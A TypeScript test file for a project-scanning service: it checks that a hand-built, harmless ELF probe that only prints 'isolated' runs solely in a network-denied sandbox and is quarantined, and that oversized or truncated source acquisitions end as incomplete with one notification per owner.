function nativeProbe(): Uint8Array {
  const message = [...new TextEncoder().encode("isolated\n")];
  const code = [
    ...[0xb8, 1, 0, 0, 0], // mov eax, 1 (write)
    ...[0xbf, 1, 0, 0, 0], // mov edi, 1 (stdout)
    ...[0x48, 0x8d, 0x35, 0x10, 0, 0, 0], // lea rsi, [rip + 16]
    ...[0xba, message.length, 0, 0, 0], // mov edx, length
    ...[0x0f, 0x05], // syscall
    ...[0xb8, 60, 0, 0, 0], // mov eax, 60 (exit)
    ...[0x31, 0xff], // xor edi, edi
    ...[0x0f, 0x05], // syscall
  ];
  const size = 64 + 56 + code.length + message.length;
  const bytes = new Uint8Array(size);
  const view = new DataView(bytes.buffer);
  bytes.set([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1]);
  view.setUint16(16, 2, true); // ET_EXEC
  view.setUint16(18, 0x3e, true); // x86-64
  view.setUint32(20, 1, true);
  view.setBigUint64(24, 0x400078n, true);
  view.setBigUint64(32, 64n, true);
  view.setUint16(52, 64, true);
  view.setUint16(54, 56, true);
  view.setUint16(56, 1, true);
  view.setUint32(64, 1, true); // PT_LOAD
  view.setUint32(68, 5, true); // read + execute
  view.setBigUint64(80, 0x400000n, true);
  view.setBigUint64(88, 0x400000n, true);
  view.setBigUint64(96, BigInt(size), true);
  view.setBigUint64(104, BigInt(size), true);
  view.setBigUint64(112, 0x1000n, true);
  bytes.set([...code, ...message], 120);
  return bytes;
}

test.skipIf(!SANDBOX_URL)(
  "a native artifact runs only in the real disposable sandbox and stays quarantined",
  async () => {
    const probe = nativeProbe();
    await commit(
      {
        "bin/probe": probe,
        "artifacts/unsupported.exe": "MZharmless unsupported fixture",
      },
      "Add native and unsupported artifacts",
    );
    const report = await runScanPass(config);
    expect(report.assessments).toHaveLength(1);
    expect(report.assessments[0]).toMatchObject({
      state: "published",
      disposition: "incomplete",
      outcome: "accepted",
    });
    const { assessmentId } = report.assessments[0];
    const result = (await vetting.getAssessment(assessmentId))?.result;
    if (!result || !isScanResult(result)) throw new Error("no bounded result");
    // The released identity comes from the runner, never from the controller.
    expect(result.execution).toMatchObject({
      isolation: "sandbox",
      imageSha256: process.env.RUNNER_IMAGE_SHA256,
      secretsProvided: false,
      egress: "default-deny",
    });
    const native = result.artifacts.find((item) => item.path === "bin/probe");
    expect(native).toMatchObject({
      sha256: digest(probe),
      state: "quarantined",
      requestedExecution: true,
    });
    expect(
      result.artifacts.find(
        (item) => item.path === "artifacts/unsupported.exe",
      ),
    ).toMatchObject({ state: "quarantined", requestedExecution: false });
    expect(result.visibilityGaps).toContain(
      "Isolated analysis does not yet support these artifacts: 1 artifact records",
    );
    // The reviewer read the bounded execution output as an inventory item.
    expect(reviewedItems.some((item) => item.id.startsWith("execution:"))).toBe(
      true,
    );
    expect(
      reviewedItems.find((item) => item.id.startsWith("execution:"))?.text,
    ).toContain('"stdout":"isolated\\n"');
    // The exact runner response is retained as private evidence.
    const labels = sqlite
      .query(
        "SELECT label FROM vetting_evidence_objects WHERE assessment_id = ?",
      )
      .all(assessmentId) as { label: string }[];
    expect(labels.map((row) => row.label)).toContain(
      "Isolated artifact execution 1",
    );
    expect((await activate()).status).toBe(422);
    expect((await runScanPass(config)).assessments).toEqual([]);
  },
  120000,
);

for (const scenario of [
  { source: "entries", evidenceUp: true },
  { source: "entries", evidenceUp: false },
  { source: "oversized", evidenceUp: true },
  { source: "truncated", evidenceUp: true },
] as const) {
  test(`an acquisition ${scenario.source} policy refusal completes as incomplete and notifies each owner once (evidence available: ${scenario.evidenceUp})`, async () => {
    const { evidenceUp } = scenario;
    if (scenario.source === "entries")
      await commit(
        Object.fromEntries(
          Array.from({ length: 1030 }, (_, index) => [
            `many/file-${String(index).padStart(4, "0")}.ts`,
            "export const value = 1;\n",
          ]),
        ),
        "Exceed the supported source inventory",
      );
    if (scenario.source !== "entries") sourceResponse = scenario.source;
    provider.evidenceUp = evidenceUp;
    const pass = await runScanPass(config);
    expect(pass.assessments).toHaveLength(1);
    const outcome = pass.assessments[0];
    expect(outcome).toMatchObject({
      state: "published",
      disposition: "incomplete",
      outcome: "accepted",
      specialist: false,
      evidence: evidenceUp ? "retained" : "failed",
    });
    const assessment = await vetting.getAssessment(outcome.assessmentId);
    expect(assessment?.state).toBe("incomplete");
    const result = assessment?.result;
    if (!assessment || !result || !isScanResult(result))
      throw new Error("Missing incomplete scan result");
    expect(result.assessed.commitSha).toBe(commitSha);
    expect(result.assessed.templateSha256).toBe(templateSha256);
    const reason =
      scenario.source === "entries"
        ? `Source entry limit exceeded: observed ${git("ls-tree", "-r", "-t", "HEAD").toString().trim().split("\n").length} entries, maximum 1024`
        : scenario.source === "oversized"
          ? "Input response size limit exceeded: maximum 4194304 bytes; complete size unavailable"
          : "Source tree is truncated";
    expect(result.visibilityGaps).toEqual([
      `Acquisition refused before inspection: ${reason}`,
    ]);
    for (const coverage of Object.values(result.coverage))
      expect(coverage).toEqual({ state: "unsupported", items: 0 });
    expect(
      Object.values(result.checks).every((state) => state === "not-run"),
    ).toBe(true);
    expect(result.primaryReview).toMatchObject({
      status: "not-started",
      verdict: null,
      risk: null,
      findingCount: 0,
    });
    expect(result.specialistReview).toBeNull();
    expect(summarize(assessment).modelRuns).toEqual([]);
    expect(provider.calls).toEqual([]);
    expect(await retained.evidence.retained(result)).toBe(evidenceUp);
    expect((await activate()).status).toBe(422);
    const notices = () =>
      sqlite
        .query(
          "SELECT recipient_github_id, action_path FROM notifications WHERE kind='project_scan_failed' ORDER BY recipient_github_id",
        )
        .all();
    const project = await projects.getProject("open-registry");
    if (!project) throw new Error("Missing fixture project");
    const owners = [
      ...new Set([
        APPLICANT.githubId,
        String(project.manifest.steward.github.actorId),
      ]),
    ].sort();
    expect(notices()).toEqual(
      owners.map((recipient_github_id) => ({
        recipient_github_id,
        action_path: "/projects/open-registry",
      })),
    );
    // The same pin is now resolved, not polled forever or notified again.
    expect((await runScanPass(config)).assessments).toEqual([]);
    expect(notices()).toHaveLength(owners.length);
    expect(provider.calls).toEqual([]);
  });
}
